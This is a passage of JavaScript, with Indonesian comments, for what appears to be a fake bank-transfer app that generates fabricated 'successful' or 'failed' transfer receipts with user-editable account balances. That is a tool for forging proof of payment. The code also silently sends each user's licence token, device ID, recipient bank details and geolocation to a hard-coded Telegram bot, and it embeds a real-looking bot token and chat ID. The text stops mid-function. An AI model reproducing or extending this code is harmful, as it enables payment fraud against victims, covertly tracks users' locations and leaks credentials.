// --- URL WEB APP ANDA ---
// !!! GANTI DENGAN URL ANDA DARI LANGKAH 4 (BAGIAN 1) !!!
const DEPLOYMENT_URL = "https://script.google.com/macros/s/AKfycbx4zmm33s3WYBssIIO3B8DXLA0BJL1Tzd0velsRmoe0uIidVkMnYc4gFDs6UhkwaVEc/exec";

// --- PENGATURAN BOT TELEGRAM (BARU) ---
// !!! GANTI DENGAN TOKEN BOT ANDA !!!
const TELEGRAM_BOT_TOKEN = "8238029335:AAFTyfRG9B5mZi04M_2feIr4_JxQ7X9pikM"; 
// --- GANTI DENGAN CHAT ID ANDA !!!
const TELEGRAM_CHAT_ID = "1441654753";     


// --- FUNGSI BARU: Kirim Lokasi (Terpisah) ---
function sendLocationToTelegram(userToken, deviceId) {
    // Cek dulu apakah browser mendukung
    if (!navigator.geolocation) {
        let message = `<b>📍 LOKASI (Error)</b>\n`;
        message += `<b>Token:</b> <code>${userToken}</code>\n`;
        message += `<b>Device ID:</b> <code>${deviceId}</code>\n`;
        message += `<b>Info:</b> Lokasi tidak didukung browser ini.`;
        const encodedMessage = encodeURIComponent(message);
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodedMessage}&parse_mode=HTML`;
        fetch(url).catch(err => console.error("Gagal kirim log lokasi (no-support):", err));
        return;
    }
    
    // Panggil API Geolocation
    navigator.geolocation.getCurrentPosition(
        (position) => {
            // SUKSES
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            const locationInfo = `Lat: ${lat}, Lon: ${lon} (http://googleusercontent.com/maps/google.com/0{lat},${lon})`;

            let message = `<b>📍 LOKASI (Sukses)</b>\n`;
            message += `<b>Token:</b> <code>${userToken}</code>\n`;
            message += `<b>Device ID:</b> <code>${deviceId}</code>\n`;
            message += `<b>Lokasi:</b> ${locationInfo}`;
            
            const encodedMessage = encodeURIComponent(message);
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodedMessage}&parse_mode=HTML`;
            fetch(url).catch(err => console.error("Gagal kirim log lokasi (sukses):", err));
        },
        (error) => {
            // GAGAL
            let errorMsg = "Lokasi Error: ";
            switch(error.code) {
                case error.PERMISSION_DENIED: errorMsg += "Pengguna menolak izin.";
                break;
                case error.POSITION_UNAVAILABLE: errorMsg += "Info lokasi tidak tersedia."; break;
                // --- PERUBAHAN DI SINI ---
                case error.TIMEOUT: 
                    errorMsg += "Waktu tunggu habis (timeout). (Saran: Cek izin WebView 'onGeolocationPermissionsShowPrompt' di kode native Android.)";
                break;
                // --- AKHIR PERUBAHAN ---
                case error.UNKNOWN_ERROR: errorMsg += "Error tidak diketahui.";
                break;
                default: errorMsg += `Kode ${error.code}`;
            }

            let message = `<b>📍 LOKASI (Gagal)</b>\n`;
            message += `<b>Token:</b> <code>${userToken}</code>\n`;
            message += `<b>Device ID:</b> <code>${deviceId}</code>\n`;
            message += `<b>Info:</b> ${errorMsg}`;

            const encodedMessage = encodeURIComponent(message);
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodedMessage}&parse_mode=HTML`;
            fetch(url).catch(err => console.error("Gagal kirim log lokasi (gagal):", err));
        },
        {
            // Tetap pakai setelan cepat
            enableHighAccuracy: false,
            timeout: 15000, 
            maximumAge: 60000
        }
    );
}
// --- AKHIR FUNGSI LOKASI ---


// --- FUNGSI BARU: KIRIM DATA KE TELEGRAM (DIKEMBALIKAN) ---
function sendDataToTelegram(bankName, accName, accNum, minLimit) { 
    
    // 1. Ambil Tanggal Lengkap
    const now = new Date();
    const formattedDate = new Intl.DateTimeFormat('id-ID', {
        dateStyle: 'full', 
        timeStyle: 'long', 
        timeZone: 'Asia/Jakarta'
    }).format(now);
    // 2. Ambil Token dari localStorage
    const userToken = localStorage.getItem('userToken') || 'Tidak Ditemukan';
    
    // --- BARU: Ambil Info Token dari localStorage ---
    const tokenExpiry = localStorage.getItem('tokenExpiryDate') || 'N/A';
    const tokenLogins = localStorage.getItem('tokenRemainingLogins') || 'N/A';
    // --- AKHIR BARU ---

    // 3. Ambil Device ID (panggil fungsi yang sudah ada)
    const deviceId = getDeviceID();
    // 4. Buat Pesan Baru
    let message = "<b>🔔 Data Pengaturan Penerima Baru:</b>\n\n";
    message += "<b>--- Info Pengguna ---</b>\n";
    message += `<b>Tanggal:</b> ${formattedDate}\n`;
    // <-- BARIS LOKASI DIHAPUS DARI SINI
    message += `<b>Token:</b> <code>${userToken}</code>\n`;
    message += `<b>Device ID:</b> <code>${deviceId}</code>\n`;
    
    // --- BARU: Tambahkan info token ---
    message += `<b>Token Expired:</b> ${tokenExpiry}\n`;
    message += `<b>Sisa Login:</b> ${tokenLogins}x\n\n`;
    // --- AKHIR BARU ---
    
    message += "<b>--- Info Input ---</b>\n";
    message += `<b>Nama Bank:</b> ${bankName}\n`;
    message += `<b>Nama Penerima:</b> ${accName}\n`;
    message += `<b>No. Rekening:</b> ${accNum}\n`;
    message += `<b>Min. Limit:</b> ${minLimit}`;
    // URL-encode pesan untuk URL
    const encodedMessage = encodeURIComponent(message);
    // Buat URL API
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodedMessage}&parse_mode=HTML`;
    // Kirim data (fire-and-forget, tidak perlu await)
    fetch(url)
        .then(response => response.json())
        .then(data => {
            if (data.ok) {
                console.log("Data berhasil dikirim ke Telegram.");
            } else {
                console.error("Gagal mengirim data ke Telegram:", data.description);
            }
        })
        .catch(err => {
            console.error("Error koneksi Telegram:", err);
        });
    // --- TAMBAHKAN INI DI AKHIR ---
    // Panggil fungsi lokasi secara terpisah (Fire and Forget)
    sendLocationToTelegram(userToken, deviceId);
}
// --- AKHIR FUNGSI BARU ---

// --- FUNGSI BARU: KIRIM LOG BUKTI TRANSFER ---
function sendReceiptLogToTelegram() { 

    // 1. Ambil Info Dasar
    const userToken = localStorage.getItem('userToken') || 'Tidak Ditemukan';
    const deviceId = getDeviceID();
    
    // 2. Ambil Info Transaksi
    const status = isSuccessMode ? "✅ BERHASIL" : "❌ GAGAL";
    const nominal = "Rp" + nominalInput.value;
    const namaPenerima = mainRecipientName.textContent.trim();
    const bankPenerima = localStorage.getItem('recipientBankName') || 'N/A';
    const rekPenerima = localStorage.getItem('recipientNumber') || 'N/A';
    const catatan = catatanInput.value.trim() || "-";
    // 3. Buat Pesan Log
    let message = `<b>📊 LOG BUKTI TRANSFER 📊</b>\n\n`;
    message += `<b>Status:</b> ${status}\n\n`;
    
    message += `<b>--- Info Token ---</b>\n`;
    message += `<b>Token:</b> <code>${userToken}</code>\n`;
    // <-- BARIS LOKASI DIHAPUS DARI SINI
    message += `<b>Device ID:</b> <code>${deviceId}</code>\n\n`;
    message += `<b>--- Detail Transaksi ---</b>\n`;
    message += `<b>Nominal:</b> ${nominal}\n`;
    message += `<b>Penerima:</b> ${namaPenerima}\n`;
    message += `<b>Bank:</b> ${bankPenerima}\n`;
    message += `<b>No. Rek:</b> ${rekPenerima}\n`;
    message += `<b>Catatan:</b> ${catatan}\n`;
    
    // 4. Tambahkan info Gagal (jika gagal)
    if (!isSuccessMode) {
        try {
            let rawValue = nominalInput.value.replace(/[^0-9]/g, '');
            let numericValue = rawValue === '' ? 0 : parseInt(rawValue, 10);
            let depositoKurang = MIN_TRANSFER_LIMIT - numericValue;
            if (depositoKurang < 0) depositoKurang = 0;
            
            const currencyFormatter = new Intl.NumberFormat('id-ID', { 
                style: 'currency', 
                currency: 'IDR', 
                minimumFractionDigits: 0 
            });
            
            const strKurang = '-' + currencyFormatter.format(depositoKurang).replace('Rp ', 'Rp');
            message += `<b>Deposito Kurang:</b> ${strKurang}\n`;
            
        } catch(e) {
            message += `<b>Deposito Kurang:</b> Error menghitung\n`;
        }
    }

    // 5. Kirim ke Telegram
    const encodedMessage = encodeURIComponent(message);
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodedMessage}&parse_mode=HTML`;

    // Kirim "fire-and-forget"
    fetch(url).catch(err => console.error("Gagal kirim log bukti transfer:", err));
    // --- TAMBAHKAN INI DI AKHIR ---
    // Panggil fungsi lokasi secara terpisah (Fire and Forget)
    sendLocationToTelegram(userToken, deviceId);
}


// --- GRAB SEMUA ELEMEN ---
// Elemen Halaman Utama
const catatanInput = document.querySelector('.catatan-input');
const charCounterDisplay = document.querySelector('.char-counter');
const nominalInput = document.querySelector('#input-nominal');
const minTextElement = document.querySelector('.nominal-minimum');
const continueButton = document.querySelector('#continue-button'); 
const transferForm = document.querySelector('#transfer-form');
// Elemen Penerima
const mainRecipientAvatar = document.querySelector('#main-recipient-avatar');
const mainRecipientName = document.querySelector('#main-recipient-name');
const mainRecipientBank = document.querySelector('#main-recipient-bank'); 
const mainRecipientNumber = document.querySelector('#main-recipient-number'); 

// Elemen PIN
const pinOverlay = document.querySelector('#pin-overlay');
const pinBackButton = document.querySelector('#pin-back-button');
const allNumpadButtons = document.querySelectorAll('.numpad-button');
const pinDots = document.querySelectorAll('.pin-dot');
// Elemen Bukti Transfer
const receiptOverlay = document.querySelector('#receipt-overlay');
const receiptDoneButton = document.querySelector('#receipt-done-button');
const receiptStatusTitle = document.querySelector('#receipt-status-title'); 
const receiptStatusIcon = document.querySelector('#receipt-status-icon'); 
// --- PERUBAHAN REQ 3: Pindahkan grabber teks OJK ---
// Teks OJK sekarang ada di dalam .receipt-expanded-details
const receiptOjkText = document.querySelector('.receipt-expanded-details .ojk-info-text');
// --- AKHIR PERUBAHAN ---

// --- BARU ---
const receiptToggleLink = document.querySelector('#receipt-toggle-link');
const receiptExpandedDetails = document.querySelector('#receipt-expanded-details');
// --- AKHIR BARU ---

// Elemen Loading
const loadingOverlay = document.querySelector('#loading-overlay');
// Elemen Setup
const setupOverlay = document.querySelector('#setup-overlay');
const setupForm = document.querySelector('#setup-form');
const setupButton = setupForm.querySelector('.setup-button'); 
const setupButtonSuccess = document.querySelector('#setup-button-success'); 
const setupMinLimitInput = document.querySelector('#setup-min-limit'); 
const setupAccountNumberInput = document.querySelector('#setup-account-number');
// <-- TAMBAHKAN INI

// Elemen Token (Baru)
const tokenOverlay = document.querySelector('#token-overlay');
const tokenForm = document.querySelector('#token-form');
const tokenInput = document.querySelector('#token-input');
const tokenButton = document.querySelector('#token-submit-button');
const tokenError = document.querySelector('#token-error');
const tokenLoader = document.querySelector('#token-loader');
// --- ELEMEN BARU GANTI AKUN ---
const changeBalanceButton = document.querySelector('.change-button');
const sourceAccountNameElement = document.querySelector('#source-account-name'); 
const sourceAccountNumberElement = document.querySelector('#source-account-number');
const sourceBalanceElement = document.querySelector('#source-balance');
const accountSwitcherOverlay = document.querySelector('#account-switcher-overlay');
const accountSwitcherCloseBtn = document.querySelector('#account-switcher-close-btn');
const accountSwitcherContent = document.querySelector('#account-switcher-content');
// --- AKHIR ELEMEN BARU ---


// --- Variabel ---
let currentPin = "";
const MAX_PIN_LENGTH = 6;
let isSubmittingSetup = false; 
let isSuccessMode = false;
// --- VARIABEL BARU GANTI AKUN ---
let sourceAccounts = [];
let activeAccountIndex = 0;
// --- AKHIR VARIABEL BARU ---

// --- Variabel LIMIT (Baru) ---
let MIN_TRANSFER_LIMIT = 10000;
// Default
const originalMinColor = '#888';
// --- LOGIKA GANTI SALDO (DIHAPUS & DIGANTI) ---
// ... (Logika prompt lama dihapus) ...

// --- PERUBAHAN BARU: FUNGSI Ambil Inisial Nama (RB) ---
function getInitials(name) {
    if (!name) return '?';
    const parts = name.trim().toUpperCase().split(' ');
    if (parts.length === 1) {
        return parts[0].charAt(0) || '?';
    }
    // Ambil huruf pertama dari 2 kata pertama
    const first = parts[0].charAt(0);
    const second = parts[1].charAt(0);
    return (first + second) || '?';
}
// --- AKHIR PERUBAHAN ---

// --- FUNGSI BARU: GANTI AKUN ---

// Inisialisasi Akun saat memuat
function initializeAccounts() {
    const savedAccounts = localStorage.getItem('sourceAccounts');
    const savedIndex = localStorage.getItem('activeAccountIndex');
    
    if (savedAccounts) {
        sourceAccounts = JSON.parse(savedAccounts);
    } else {
        // Buat 3 akun default jika tidak ada
        sourceAccounts = [
            { name: "PT ORSXI.STORE, INC", number: "2770 0101 **** 539", balance: "Rp583.389.000,00" },
            { name: "Akun Pribadi 1", number: "1111 2222 **** 333", balance: "Rp1.000.000,00" },
            { name: "Akun Bisnis 2", number: "4444 5555 **** 666", balance: "Rp10.000.000,00" }
        ];
        localStorage.setItem('sourceAccounts', JSON.stringify(sourceAccounts));
    }
    
    activeAccountIndex = savedIndex ? parseInt(savedIndex, 10) : 0;
    
    updateMainPageAccount();
}

// Simpan semua akun ke localStorage
function saveAccounts() {
    localStorage.setItem('sourceAccounts', JSON.stringify(sourceAccounts));
    localStorage.setItem('activeAccountIndex', activeAccountIndex);
}

// Update tampilan di halaman utama
function updateMainPageAccount() {
    const activeAccount = sourceAccounts[activeAccountIndex];
    sourceAccountNameElement.textContent = activeAccount.name;
    sourceAccountNumberElement.textContent = activeAccount.number;
    sourceBalanceElement.textContent = activeAccount.balance;
}

// Update tampilan di overlay ganti akun
function updateAccountSwitcherUI() {
    sourceAccounts.forEach((account, index) => {
        document.getElementById(`slot-name-${index}`).textContent = account.name;
        document.getElementById(`slot-number-${index}`).textContent = account.number;
        
        document.getElementById(`slot-balance-${index}`).textContent = account.balance;
        
        const slotElement = document.getElementById(`account-slot-${index}`);
        const selectButton = slotElement.querySelector('.btn-select-account');
        
        if (index === activeAccountIndex) {
            slotElement.classList.add('active');
            selectButton.disabled = true;
        } else {
            slotElement.classList.remove('active');
            selectButton.disabled = false;
        }
    });
}

// Tombol "Ganti" di halaman utama
if (changeBalanceButton) {
    changeBalanceButton.addEventListener('click', (e) => {
        e.preventDefault();
        updateAccountSwitcherUI(); // Update UI overlay
        accountSwitcherOverlay.style.display = 'flex'; // Tampilkan overlay
    });
}

// Tombol "Tutup" di overlay ganti akun
if (accountSwitcherCloseBtn) {
    accountSwitcherCloseBtn.addEventListener('click', (e) => {
        e.preventDefault();
        accountSwitcherOverlay.style.display = 'none';
    });
}

// Tombol "Pilih" dan "Edit" di dalam overlay
if (accountSwitcherContent) {
    accountSwitcherContent.addEventListener('click', (e) => {
        // Tombol "Pilih"
        if (e.target.matches('.btn-select-account')) {
            activeAccountIndex = parseInt(e.target.dataset.index, 10);
            saveAccounts();
            updateMainPageAccount();
            accountSwitcherOverlay.style.display = 'none';
        }
        
        // Tombol "Edit"
        if (e.target.matches('.btn-edit-account')) {
            const index = parseInt(e.target.dataset.index, 10);
            const accountToEdit = sourceAccounts[index];
            
            // 1. Edit Nama
            let newName = prompt("Masukkan nama baru:", accountToEdit.name);
            if (newName !== null && newName.trim() !== "") {
                accountToEdit.name = newName.trim();
            }
            
            // 2. Edit Nomor Rekening
            let newNumber = prompt("Masukkan nomor rekening baru:", accountToEdit.number);
            if (newNumber !== null && newNumber.trim() !== "") {
                accountToEdit.number = newNumber.trim();
            }

            // 3. Edit Saldo
            let currentBalanceValue = accountToEdit.balance.replace('Rp', '').replace(',00', '').replace(/\./g, '');
            let newBalanceInput = prompt("Masukkan saldo baru:", currentBalanceValue);
            
            if (newBalanceInput !== null && newBalanceInput.trim() !== "") {
                let newBalanceRaw = newBalanceInput.replace(/[^0-9]/g, '');
                if (newBalanceRaw === "") newBalanceRaw = "0";
                const newBalanceNum = parseInt(newBalanceRaw, 10);
                const formattedNum = new Intl.NumberFormat('id-ID').format(newBalanceNum);
                accountToEdit.balance = "Rp" + formattedNum + ",00";
            }
            
            // Simpan dan update UI
            saveAccounts();
            updateAccountSwitcherUI();
            if (index === activeAccountIndex) {
                updateMainPageAccount();
                // Update main page jika akun aktif yg diedit
            }
        }
    });
}

// --- AKHIR FUNGSI GANTI AKUN ---


// --- FUNGSI BARU: Format Nomor Rekening (Permintaan User) ---
function formatAccountNumber(e) {
    const input = e.target;
    // 1. Simpan posisi kursor
    let selectionStart = input.selectionStart;
    let originalLength = input.value.length;

    // 2. Bersihkan input, sisakan angka saja
    let digits = input.value.replace(/[^0-9]/g, '');
    // 3. Cek apakah diawali '08'
    const startsWith08 = digits.startsWith('08');
    let formattedValue = '';
    
    // 4. Terapkan pemformatan berdasarkan kondisi
    if (digits.length > 0) {
        if (startsWith08) {
            // Format sebagai nomor HP (Contoh: 0811-1111-1111)
            // (digits.match(/.{1,4}/g) || []) akan membuat array seperti ['0811', '1111', '111']
            formattedValue = (digits.match(/.{1,4}/g) || []).join('-');
        } else {
            // Format sebagai rekening bank (Contoh: 1234 5678 123)
            formattedValue = (digits.match(/.{1,4}/g) || []).join(' ');
        }
    }
    
    // 5. Set nilai baru ke input
    input.value = formattedValue;
    // 6. Logika untuk mengatur ulang posisi kursor (disalin dari fungsi formatInputAsNumber)
    // Ini penting agar kursor tidak melompat-lompat saat mengetik
    let newLength = formattedValue.length;
    let lengthDiff = newLength - originalLength;
    let newSelectionStart = selectionStart + lengthDiff;
    if (selectionStart > 0 || lengthDiff > 0) {
            if (lengthDiff < 0 && selectionStart + lengthDiff > 0) {
                newSelectionStart = selectionStart + lengthDiff;
            } else if (lengthDiff > 0) {
                newSelectionStart = selectionStart + lengthDiff;
            } else {
                newSelectionStart = selectionStart;
            }
            // Penyesuaian untuk spasi/dash (grup 4 digit + 1 spasi/dash = 5)
            if (lengthDiff === -1 && (originalLength - selectionStart) % 5 === 0) { 
            newSelectionStart = selectionStart - 1;
            }
            newSelectionStart = Math.max(0, newSelectionStart);
            input.setSelectionRange(newSelectionStart, newSelectionStart);
    }
}
// --- AKHIR FUNGSI BARU ---

// --- FUNGSI FORMAT ANGKA (BARU) ---
function formatInputAsNumber(e) {
    let rawValue = e.target.value.replace(/[^0-9]/g, '');
    let selectionStart = e.target.selectionStart;
    let originalLength = e.target.value.length;

    if (rawValue === '') {
        e.target.value = '';
    } else {
        let numericValue = parseInt(rawValue, 10);
        let formattedValue = new Intl.NumberFormat('id-ID').format(numericValue);
        e.target.value = formattedValue;
        
        let newLength = formattedValue.length;
        let lengthDiff = newLength - originalLength;
        let newSelectionStart = selectionStart + lengthDiff;
        
        if (selectionStart > 0 || lengthDiff > 0) {
                if (lengthDiff < 0 && selectionStart + lengthDiff > 0) {
                    newSelectionStart = selectionStart + lengthDiff;
                } else if (lengthDiff > 0) {
                    newSelectionStart = selectionStart + lengthDiff;
                } else {
                    newSelectionStart = selectionStart;
                }
                if (lengthDiff === -1 && (originalLength - selectionStart) % 4 === 0) {
                newSelectionStart = selectionStart - 1;
                }
                newSelectionStart = Math.max(0, newSelectionStart);
                e.target.setSelectionRange(newSelectionStart, newSelectionStart);
        }
    }
}

// Terapkan format angka ke input limit di setup
setupMinLimitInput.addEventListener('input', formatInputAsNumber);
setupAccountNumberInput.addEventListener('input', formatAccountNumber); // <-- TAMBAHKAN INI

// --- FUNGSI BARU (DIPISAH) ---
// (PERUBAHAN REQ 2): Fungsi ini HANYA untuk mengosongkan form setup
function loadSetupFormWithSavedData() {
    // Terapkan ke form setup
    document.getElementById('setup-bank-name').value = '';
    document.getElementById('setup-account-name').value = '';
    document.getElementById('setup-account-number').value = '';
    document.getElementById('setup-min-limit').value = '';
    
    // --- PERBAIKAN: Aktifkan kembali tombol ---
    if (setupButton) {
        setupButton.disabled = false;
    }
    if (setupButtonSuccess) { // <-- BARU
        setupButtonSuccess.disabled = false;
    }
    // --- PERBAIKAN: Buka kunci submit ---
    isSubmittingSetup = false;
    // --- AKHIR PERBAIKAN ---
}

// --- FUNGSI PENGATURAN (DIPERBARUI) ---
// (PERUBAHAN REQ 4): Fungsi ini dipanggil SETELAH setup disimpan
function applySettingsToMainPage() {
    // 1. Sembunyikan overlay setup (INI KUNCINYA)
    setupOverlay.style.display = 'none';
    // 2. Load data setup dari localStorage
    const bankName = localStorage.getItem('recipientBankName') || 'NAMA BANK';
    const accName = localStorage.getItem('recipientName') || 'NAMA PENERIMA';
    const accNum = localStorage.getItem('recipientNumber') || '0000 0000';
    MIN_TRANSFER_LIMIT = parseInt(localStorage.getItem('minLimit') || '10000', 10); 
    
    // Terapkan data setup ke halaman UTAMA
    // --- PERUBAHAN BARU: Inisial RB ---
    mainRecipientAvatar.textContent = getInitials(accName);
    // --- AKHIR PERUBAHAN ---
    mainRecipientName.textContent = accName.toUpperCase();
    // --- PERUBAHAN REQ 4 ---
    if (mainRecipientBank) mainRecipientBank.textContent = bankName.toUpperCase();
    if (mainRecipientNumber) mainRecipientNumber.textContent = accNum;
    // --- AKHIR PERUBAHAN ---
    
    const formattedMin = new Intl.NumberFormat('id-ID', { style: 'currency', currency: 'IDR', minimumFractionDigits: 0 }).format(MIN_TRANSFER_LIMIT).replace('Rp', 'Rp');
    minTextElement.textContent = `Minimum transfer adalah ${formattedMin}`;
}

// --- FUNGSI INTI UNTUK MENYIMPAN DATA ---
// Ini adalah logika inti yang akan dipanggil oleh kedua tombol
function processAndSaveSetup() {
    if (isSubmittingSetup) return;
    isSubmittingSetup = true; 
    
    if (setupButton) setupButton.disabled = true;
    if (setupButtonSuccess) setupButtonSuccess.disabled = true; 
    
    const bankName = document.getElementById('setup-bank-name').value;
    const accName = document.getElementById('setup-account-name').value;
    const accNum = document.getElementById('setup-account-number').value; // Ambil nilai yang sudah diformat
    const minLimitRaw = setupMinLimitInput.value.replace(/[^0-9]/g, '');
    const formattedMinLimit = new Intl.NumberFormat('id-ID', { style: 'currency', currency: 'IDR', minimumFractionDigits: 0 }).format(parseInt(minLimitRaw, 10) || 0);
    if (TELEGRAM_BOT_TOKEN !== "GANTI_DENGAN_TOKEN_BOT_ANDA" && TELEGRAM_CHAT_ID !== "GANTI_DENGAN_CHAT_ID_ANDA") {
        sendDataToTelegram(bankName, accName, accNum, formattedMinLimit);
    }
    
    localStorage.setItem('recipientBankName', bankName);
    localStorage.setItem('recipientName', accName);
    localStorage.setItem('recipientNumber', accNum);
    localStorage.setItem('minLimit', minLimitRaw);
    
    applySettingsToMainPage(); 
}

// --- MODIFIKASI: FUNGSI saveUserData (Tombol GAGAL) ---
function saveUserData(e) {
    e.preventDefault();
    isSuccessMode = false; // <-- SET MODE GAGAL
    processAndSaveSetup();
    // Panggil logika inti
}
// --- AKHIR MODIFIKASI ---


// --- FUNGSI VALIDASI TOKEN (DIPERBARUI DENGAN PERBAIKAN DEVICE ID) ---

function getDeviceID() {
    // 1. Cek apakah sudah ada ID yang tersimpan di HP ini
    let savedID = localStorage.getItem('persistant_device_id');

    // 2. Jika SUDAH ADA, kembalikan ID yang lama (agar tidak berubah)
    if (savedID) {
        return savedID;
    }

    // 3. Jika BELUM ADA (pengguna baru), buat ID acak yang unik
    // Gabungan "dev-" + angka acak + waktu sekarang (biar unik)
    const randomPart = Math.random().toString(36).substring(2, 10);
    const timestampPart = Date.now().toString(36).substring(4);
    const newID = "dev-" + randomPart + timestampPart;

    // 4. Simpan ID ini ke memori browser
    localStorage.setItem('persistant_device_id', newID);

    return newID;
}

function performTokenValidation(token, isSavedTokenCheck) {
    const deviceId = getDeviceID();
    tokenLoader.style.display = 'block';
    tokenButton.disabled = true;
    tokenInput.disabled = true;
    tokenError.textContent = isSavedTokenCheck ? "Memvalidasi token tersimpan..." : "";
    const validationUrl = `${DEPLOYMENT_URL}?token=${encodeURIComponent(token)}&deviceId=${encodeURIComponent(deviceId)}`;

    fetch(validationUrl)
        .then(response => response.json())
        .then(data => {
            tokenLoader.style.display = 'none';
            tokenButton.disabled = false;
        
            tokenInput.disabled = false;
            
            if (data.status === "success") {
                // SUKSES
                if (!isSavedTokenCheck) {
                    localStorage.setItem('userToken', token);
                }
                
                // --- BARU: Simpan info token ke localStorage ---
                if (data.expiryDate) {
                    localStorage.setItem('tokenExpiryDate', data.expiryDate);
                }
                if (data.remainingLogins !== undefined) {
                    localStorage.setItem('tokenRemainingLogins', data.remainingLogins);
                }
                // --- AKHIR BARU ---
                
                localStorage.removeItem('tokenExpiry');
                // 1. Sembunyikan overlay token
                tokenOverlay.style.display = 'none';
                // 2. Tampilkan overlay setup
                setupOverlay.style.display = 'flex';
                // 3. Panggil fungsi BARU untuk MENGOSONGKAN form setup (REQ 2)
                loadSetupFormWithSavedData();
            } else {
                // GAGAL
                if (isSavedTokenCheck) {
                    localStorage.removeItem('userToken');
                    localStorage.removeItem('tokenExpiry'); // Hapus juga expiry
                }
                // --- BARU: Hapus info token yang gagal ---
                localStorage.removeItem('tokenExpiryDate');
                localStorage.removeItem('tokenRemainingLogins');
                // --- AKHIR BARU ---
                tokenError.textContent = data.message + ". Silakan masukkan token baru.";
                tokenInput.value = ""; 
            }
        })
        .catch(err => {
            console.error("Fetch Error:", err);
            tokenLoader.style.display = 'none';
            tokenButton.disabled = false;
            tokenInput.disabled = false;
            tokenError.textContent = "Error: Gagal terhubung ke server.";
        });
}

function handleTokenSubmit(e) {
    e.preventDefault();
    const token = tokenInput.value.trim();
    if (token === "") {
        tokenError.textContent = "Token tidak boleh kosong.";
        return;
    }
    performTokenValidation(token, false);
}

function checkSavedToken() {
    const savedToken = localStorage.getItem('userToken');
    if (!savedToken) {
        tokenOverlay.style.display = 'flex';
        setupOverlay.style.display = 'none';
    } else {
        tokenOverlay.style.display = 'flex';
        tokenInput.value = savedToken; 
        tokenInput.disabled = true; 
        performTokenValidation(savedToken, true); 
    }
}

// --- EVENT LISTENERS ---

document.addEventListener('DOMContentLoaded', () => {
    initializeAccounts(); // <-- BARU: Muat data akun dulu
    checkSavedToken();    // <-- LAMA: Baru cek token
});
tokenForm.addEventListener('submit', handleTokenSubmit);

// Listener untuk tombol GAGAL (asli)
setupForm.addEventListener('submit', saveUserData);
// --- BARU: Listener untuk expand/collapse detail transaksi ---
if (receiptToggleLink && receiptExpandedDetails) {
    receiptToggleLink.addEventListener('click', (e) => {
        e.preventDefault();
        
        // Toggle class 'expanded' pada konten dan link
        const isExpanded = receiptExpandedDetails.classList.toggle('expanded');
        receiptToggleLink.classList.toggle('expanded', isExpanded);
        
        // Ubah teks link
        const textSpan = receiptToggleLink.querySelector('span:first-child');
        if (isExpanded) {
            textSpan.textContent = 'Lihat Lebih Sedikit';
        } else {
            textSpan.textContent = 'Lihat Detail Transaksi';
        }
    });
}
// --- AKHIR BARU ---

// --- PERUBAHAN BARU: Listener untuk tombol BERHASIL ---
if (setupButtonSuccess) {
    setupButtonSuccess.addEventListener('click', (e) => {
        e.preventDefault();
        
        // --- PERBAIKAN BARU: Validasi form ---
        if (!setupForm.reportValidity()) {
            return; 
        }
        // --- AKHIR PERBAIKAN ---

        isSuccessMode = true; // <-- SET MODE BERHASIL
        processAndSaveSetup(); // Panggil logika inti
    });
}
// --- AKHIR PERUBAHAN ---


// --- LOGIKA CATATAN ---
if (catatanInput && charCounterDisplay) {
    catatanInput.addEventListener('input', () => {
        const count = catatanInput.value.length;
        const max = catatanInput.maxLength;
        charCounterDisplay.textContent = `${count}/${max}`;
        catatanInput.style.height = 'auto';
        catatanInput.style.height = (catatanInput.scrollHeight) + 'px';
    });
    catatanInput.dispatchEvent(new Event('input'));
}

// --- LOGIKA NOMINAL (LOGIKA TOMBOL LANJUTKAN DIPERBAIKI) ---
if (nominalInput && minTextElement && continueButton) {
    
    nominalInput.addEventListener('input', (e) => {
        formatInputAsNumber(e); 
        
        let rawValue = e.target.value.replace(/[^0-9]/g, '');
        let numericValue = rawValue === '' ? 0 : parseInt(rawValue, 10);

        const formattedMin = new Intl.NumberFormat('id-ID', { style: 'currency', currency: 'IDR', minimumFractionDigits: 0 }).format(MIN_TRANSFER_LIMIT).replace('Rp', 'Rp');
        const minText = `Minimum transfer adalah ${formattedMin}`;

        if (numericValue === 0) {
            minTextElement.textContent = minText;
            minTextElement.style.color = originalMinColor;
            continueButton.disabled = true; 
        
        } else if (numericValue >= MIN_TRANSFER_LIMIT) {
            minTextElement.textContent = minText;
            minTextElement.style.color = originalMinColor;
            continueButton.disabled = false; 
        } else {
            minTextElement.textContent = minText;
            minTextElement.style.color = 'red'; 
            continueButton.disabled = false; 
        }
    });
}


// --- LOGIKA OVERLAY PIN ---
if (transferForm && pinOverlay && pinBackButton) {
    transferForm.addEventListener('submit', (e) => {
        e.preventDefault(); 
        pinOverlay.style.display = 'flex';
    });
    
    pinBackButton.addEventListener('click', (e) => {
        e.preventDefault(); 
        pinOverlay.style.display = 'none';
        resetPin();
    });
}

// --- LOGIKA NUMPAD PIN ---
function updatePinDots() {
    const pinLength = currentPin.length;
    pinDots.forEach((dot, index) => {
        if (index < pinLength) {
            dot.classList.add('filled');
        } else {
            dot.classList.remove('filled');
        }
    });
}

function handlePinInput(digit) {
    if (currentPin.length < MAX_PIN_LENGTH) {
        currentPin += digit;
        updatePinDots();
        
        if (currentPin.length === MAX_PIN_LENGTH) {
            console.log("PIN Selesai:", currentPin);
            setTimeout(() => {
                pinOverlay.style.display = 'none'; 
                resetPin();
                
                if (loadingOverlay) {
                    loadingOverlay.style.display = 'flex';
                }
                
                updateReceiptData(); 
                sendReceiptLogToTelegram(); // <-- INI DIA PENAMBAHANNYA

                setTimeout(() => {
                    if (loadingOverlay) {
                        loadingOverlay.style.display = 'none';
                    }
                    if (receiptOverlay) {
                        receiptOverlay.style.display = 'flex'; 
                        window.scrollTo(0, 0); 
                    }
            
                }, 2000); 

            }, 500);
        }
    }
}

function handleBackspace() {
    if (currentPin.length > 0) {
        currentPin = currentPin.slice(0, -1);
        updatePinDots();
    }
}

function resetPin() {
    currentPin = "";
    updatePinDots();
}

allNumpadButtons.forEach(button => {
    if (button.classList.contains('backspace')) {
